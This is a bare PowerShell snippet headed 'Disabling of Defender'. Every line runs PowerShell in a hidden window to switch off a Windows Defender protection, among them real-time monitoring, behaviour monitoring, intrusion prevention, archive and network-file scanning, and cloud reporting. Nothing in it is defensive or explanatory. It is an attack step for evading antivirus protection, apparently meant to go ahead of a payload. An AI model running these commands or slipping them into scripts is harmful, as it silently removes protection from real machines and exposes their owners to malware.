#Disabling of Defender
Powershell.exe -nop -w hidden -c Set-MpPreference -DisableRealtimeMonitoring $true
Powershell.exe -nop -w hidden -c Set-MpPreference -DisableRealtimeMonitoring $true
Powershell.exe -nop -w hidden -c Set-MpPreference -DisableArchiveScanning $true
Powershell.exe -nop -w hidden -c Set-MpPreference -DisableBehaviorMonitoring $true
Powershell.exe -nop -w hidden -c Set-MpPreference -DisableIOAVProtection $true
Powershell.exe -nop -w hidden -c Set-MpPreference -DisableIntrusionPreventionSystem $true
Powershell.exe -nop -w hidden -c Set-MpPreference -DisableScanningNetworkFiles $true
Powershell.exe -nop -w hidden -c Set-MpPreference -MAPSReporting 0
Powershell.exe -nop -w hidden -c Set-MpPreference -DisableCatchupFullScan $True
Powershell.exe -nop -w hidden -c Set-MpPreference -DisableCatchupQuickScan $True